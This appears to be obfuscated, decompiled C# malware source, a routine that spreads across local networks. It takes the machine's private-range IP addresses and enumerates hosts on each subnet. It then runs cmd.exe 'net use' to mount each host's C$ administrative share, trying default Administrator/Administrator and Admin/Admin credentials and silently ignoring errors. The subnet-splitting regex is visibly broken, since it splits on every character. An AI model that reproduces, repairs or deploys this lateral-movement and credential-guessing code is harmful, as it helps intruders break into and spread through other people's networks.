using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace ALzLGBAFaCqNDAE;

internal class GkQYwvfDqeqS
{
	public static void mSCoFKDJNxePBi()
	{
		List<QJmUvpITudv> list = QJmUvpITudv.IgPFocqsdeuvm();
		foreach (QJmUvpITudv item in list)
		{
			try
			{
				if (item.EGtKxHcFbndVxtw.StartsWith("10.") || item.EGtKxHcFbndVxtw.StartsWith("172.16.") || item.EGtKxHcFbndVxtw.StartsWith("192.168."))
				{
					ljQYfFbjIjTbHR.jjWOuFUGHOxtaU(item.tXnCLsnIorlCDQ, item.EGtKxHcFbndVxtw, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		foreach (QJmUvpITudv item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string jkitlStquTdfRmG = regex.Split(item2.EGtKxHcFbndVxtw)[0] + "." + regex.Split(item2.EGtKxHcFbndVxtw)[1] + "." + regex.Split(item2.EGtKxHcFbndVxtw)[2];
				List<string> list2 = JXHzPBkJtqLy.CCYmVaYiuTo(jkitlStquTdfRmG);
				foreach (string item3 in list2)
				{
					if (item2.EGtKxHcFbndVxtw.StartsWith("10.") || item2.EGtKxHcFbndVxtw.StartsWith("172.16.") || item2.EGtKxHcFbndVxtw.StartsWith("192.168."))
					{
						RMvUnHFCuFhAD.wRzEVCtsszv("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						RMvUnHFCuFhAD.wRzEVCtsszv("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
